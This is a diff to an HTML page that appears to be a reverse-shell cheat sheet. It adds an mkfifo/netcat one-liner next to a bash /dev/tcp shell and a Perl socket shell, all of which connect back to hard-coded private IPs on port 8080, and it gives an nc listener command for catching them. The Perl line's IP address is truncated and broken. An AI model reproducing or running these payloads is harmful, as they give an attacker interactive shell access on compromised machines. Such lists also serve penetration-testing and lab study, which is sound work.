@@ -249,7 +249,8 @@
     in all f these cases you need to listen for port 8080 using the foolowing command: <b>nc -vv -l -p 8080</b>
 <br><br>
 <b>BASH</b><br>
-bash -i >& /dev/tcp/10.20.14.203/8080 0>&1 <br><br>
+bash -i >& /dev/tcp/10.20.14.203/8080 0>&1 <br>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.61.193 8080 >/tmp/f<br>
 <b>PERL</b><br>
 perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 <br><br>
